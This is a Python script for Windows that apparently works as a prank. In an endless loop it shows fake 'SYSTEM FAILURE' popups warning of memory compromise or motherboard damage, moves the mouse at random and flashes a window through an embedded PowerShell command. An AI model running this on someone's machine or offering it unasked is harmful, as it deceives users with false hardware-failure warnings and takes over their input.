import os
import time
import random
import ctypes
import winsound
import webbrowser
import pyautogui

# Wait 10 seconds before starting (suspense)
time.sleep(10)

# Fake system failure popups
def fake_errors():
    messages = [
        "Warning: Memory Integrity Compromised.",
        "Critical System Error: Motherboard Damage Detected.",
        "A Fatal Error Has Occurred. Press OK to Continue.",
        "Unexpected I/O Exception: Please Check Your Disk."
    ]
    ctypes.windll.user32.MessageBoxW(0, random.choice(messages), "SYSTEM FAILURE", 0x10)

# Keyboard and mouse glitches
def keyboard_mouse_glitch():
    actions = [
        lambda: pyautogui.moveRel(random.randint(-300, 300), random.randint(-300, 300), duration=1),  # Mouse drifts randomly
    ]
    random.choice(actions)()

# Screen flashing effect
def screen_glitch():
    os.system("powershell -Command \"(Get-Process -Id $PID).MainWindowHandle | ForEach-Object {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\\\"user32.dll\\\")] public static extern int FlashWindowEx(IntPtr hwnd, ref FLASHWINFO pwfi); } public struct FLASHWINFO { public uint cbSize; public IntPtr hwnd; public uint dwFlags; public uint uCount; public uint dwTimeout; }' -Language CSharp; $fw = New-Object FLASHWINFO; $fw.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($fw); $fw.hwnd = $_; $fw.dwFlags = 3; $fw.uCount = 10; $fw.dwTimeout = 0; [WinAPI]::FlashWindowEx([ref]$fw)}\"")

# Loop the horror effects at random times
time.sleep(40)
while True:
    time.sleep(random.randint(20, 60))  # Random intervals between 20s-60s
    random.choice([
        fake_errors,
        keyboard_mouse_glitch,
        screen_glitch
    ])()
